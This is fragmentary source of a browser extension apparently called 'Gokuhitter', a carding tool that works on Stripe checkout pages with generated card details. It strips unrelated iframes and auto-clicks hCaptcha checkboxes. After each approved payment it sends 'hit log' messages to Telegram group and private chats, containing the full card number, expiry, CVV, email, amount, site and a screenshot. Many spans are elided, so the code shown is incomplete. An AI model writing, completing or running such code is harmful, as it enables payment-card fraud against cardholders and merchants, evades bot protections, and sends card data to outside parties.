...
function applyDarkMode() {
  ...
  (document
    ...
    document.querySelectorAll("iframe").forEach((e) => {
      ...
      const t = (e.src || "").toLowerCase(),
        n = (e.name || "").toLowerCase(),
        c = (e.id || "").toLowerCase(),
        p = e.closest("[id*='captcha'], [id*='hcaptcha'], [class*='captcha'], [class*='hcaptcha']");
      if (
        t.includes("stripe") ||
        ...
        t.includes("3ds") ||
        t.includes("newassets.hcaptcha") ||
        t.includes("imgs.hcaptcha") ||
        n.includes("captcha") ||
        n.includes("hcaptcha") ||
        c.includes("captcha") ||
        c.includes("hcaptcha") ||
        p ||
        e.dataset.hcaptcha ||
        (e.title || "").toLowerCase().includes("captcha")
      ) return;
      e.remove();
    }));
}
  ...
  if (!container) {
    ...
    style.textContent = `
      #Goku-notification-container {
        position: fixed; top: 10px; right: 10px; left: auto; z-index: 2147483647;
      ...
      #Goku-notification-container .goku-noti {
        position: relative; width: 320px; max-width: 90vw; pointer-events: auto;
      ...
      #Goku-notification-container .goku-noti.noti-success {
        background: linear-gradient(135deg, rgba(6,78,59,0.45) 0%, rgba(6,95,70,0.4) 40%, rgba(4,120,87,0.35) 100%);
        border: 1px solid rgba(52, 211, 153, 0.2);
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.25), 0 0 40px rgba(16, 185, 129, 0.1);
      }

      /* === DECLINE / ERROR === */
      #Goku-notification-container .goku-noti.noti-decline {
        background: linear-gradient(135deg, rgba(69,10,10,0.45) 0%, rgba(127,29,29,0.4) 40%, rgba(153,27,27,0.35) 100%);
        border: 1px solid rgba(239, 68, 68, 0.2);
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.25), 0 0 40px rgba(239, 68, 68, 0.1);
      }

      /* === WARNING === */
      #Goku-notification-container .goku-noti.noti-warning {
        background: linear-gradient(135deg, rgba(69,26,3,0.45) 0%, rgba(120,53,15,0.4) 40%, rgba(146,64,14,0.35) 100%);
        border: 1px solid rgba(245, 158, 11, 0.2);
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.25), 0 0 40px rgba(245, 158, 11, 0.1);
      }

      /* === INFO === */
      #Goku-notification-container .goku-noti.noti-info {
        background: linear-gradient(135deg, rgba(30,27,75,0.45) 0%, rgba(49,46,129,0.4) 40%, rgba(55,48,163,0.35) 100%);
        border: 1px solid rgba(99, 102, 241, 0.2);
        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.25), 0 0 40px rgba(99, 102, 241, 0.1);
      }

      /* Glow overlay */
      #Goku-notification-container .goku-noti-glow {
        position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; opacity: 0.3;
      }
      .noti-success .goku-noti-glow { background: radial-gradient(ellipse at 20% 20%, rgba(16, 185, 129, 0.2), transparent 60%); }
      .noti-decline .goku-noti-glow { background: radial-gradient(ellipse at 20% 20%, rgba(239, 68, 68, 0.2), transparent 60%); }
      .noti-warning .goku-noti-glow { background: radial-gradient(ellipse at 20% 20%, rgba(245, 158, 11, 0.2), transparent 60%); }
      .noti-info .goku-noti-glow { background: radial-gradient(ellipse at 20% 20%, rgba(99, 102, 241, 0.2), transparent 60%); }

      /* Content */
      #Goku-notification-container .goku-noti-content {
        position: relative; padding: 10px 14px; display: flex; flex-direction: column; gap: 2px;
      }
      ...
      #Goku-notification-container .goku-noti-label {
        font-size: 12px; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; margin: 0;
      }
      ...
      #Goku-notification-container .goku-noti-title {
        font-size: 13px; font-weight: 700; margin: 0; line-height: 1.3;
      ...
      #Goku-notification-container .goku-noti-msg-text {
        font-size: 11px; font-weight: 500; margin: 0; opacity: 0.85;
      }
      ...
      #Goku-notification-container .goku-noti-close {
        position: absolute; top: 7px; right: 8px; padding: 3px; border: none; background: transparent;
      ...
      #Goku-notification-container .goku-noti-close svg { width: 14px; height: 14px; }
...
(chrome.runtime.onMessage.addListener((e, t, n) => {
  if (!e) return;
  if ("updateSettings" === e.action) {
    state.settings = e.settings;
  } else if ("toggleExtension" === e.action) {
    state.extensionEnabled = e.enabled;
    state.extensionEnabled ? initializeExtension() : stopAutopay();
  } else if ("HCAPTCHA_TRIGGER_NOW" === e.type) {
    setTimeout(() => {
      const iframes = document.querySelectorAll("iframe");
      iframes.forEach(f => {
        const src = (f.src || "").toLowerCase();
        if (src.includes("hcaptcha.com") && src.includes("checkbox")) {
          try {
            f.contentWindow.postMessage({ type: "goku-hcaptcha-click" }, "*");
          } catch(err) {}
        }
      });
    }, 500);
  ...
  window.addEventListener("message", (e) => {
    ...
    if (
      ...
      (chrome.storage.sync.get(["hittedSites"], (e) => {
        ...
        setTimeout(() => {
          const i = state.settings.telegramName || "User",
                a = state.lastGeneratedCardDetails,
                o = t.message || "Approved",
                r = state.currentSiteInfo.name || "Unknown Site",
                s = state.currentSiteInfo.url || "#";
          const liveEmailEl = document.querySelector("input#email, input[name='email'], input[type='email'], .ReadOnlyFormField-email .ReadOnlyFormField-title");
          const liveEmail = liveEmailEl ? (liveEmailEl.value || liveEmailEl.textContent || "").trim() : "";
          const finalEmail = liveEmail || a?.email || state.settings.userEmail || "N/A";
          const amtEl = document.querySelector('#OrderDetails-TotalAmount, #ProductSummary-totalAmount, .OrderDetails-total, .CurrencyAmount, .ProductSummary-totalAmount');
          const liveAmount = amtEl ? amtEl.textContent.trim() : "$0";
          const timeTaken = state._submitStartTime ? Math.round((Date.now() - state._submitStartTime) / 1000) + "s" : "N/A";
          const cardCombo = `${a.cardNumber}|${a.expirationDate.split('/')[0]}|${a.expirationDate.split('/')[1]}|${a.cvv}`;

          const groupMsg = state.settings.sendSiteToGroup
            ? `⚡️ *New Hit Log* ⚡️\n━━━━━━━━━━━━━━━━━━━━\n\n👤  *User:*  ${i}\n🎯  *Attempt:*  ${state.attemptCount}\n💰  *Amount:*  ${liveAmount}\n🌍  *Site:*  [${r}](${s})\n\n━━━━━━━━━━━━━━━━━━━━\n_Thanks For Using Gokuhitter._ ❤️`
            : `⚡️ *New Hit Log* ⚡️\n━━━━━━━━━━━━━━━━━━━━\n\n👤  *User:*  ${i}\n🎯  *Attempt:*  ${state.attemptCount}\n💰  *Amount:*  ${liveAmount}\n\n━━━━━━━━━━━━━━━━━━━━\n_Thanks For Using Gokuhitter._ ❤️`;
          const privateMsg = `✅ *Payment Success!*\n━━━━━━━━━━━━━━━━━━━━\n💳 *Card:* \`${cardCombo}\`\n📧 *Email:* ${finalEmail}\n🎯 *Attempt:* ${state.attemptCount}\n💰 *Amount:* ${liveAmount}\n🌐 *Site:* ${r}\n⏱ *Time:* ${timeTaken}\n💬 *Response:* ${o}\n━━━━━━━━━━━━━━━━━━━━\n🔗 [Open Success URL](${s})\n\n_Thanks For Using Gokuhitter_ ❤️`;

          try {
            chrome.runtime.sendMessage(
              { action: "capture_and_send", card: a?.cardNumber },
              (e) => {
                if (chrome.runtime.lastError || !e) {
                  sendTelegramMessageToUser("GROUP", groupMsg, null);
                  sendTelegramMessageToUser("PRIVATE", privateMsg, null);
                  return;
                }
                const screenshot = e?.screenshotUrl || null;
                sendTelegramMessageToUser("GROUP", groupMsg, screenshot);
                sendTelegramMessageToUser("PRIVATE", privateMsg, screenshot);
              },
            );
          } catch (err) {
            sendTelegramMessageToUser("GROUP", groupMsg, null);
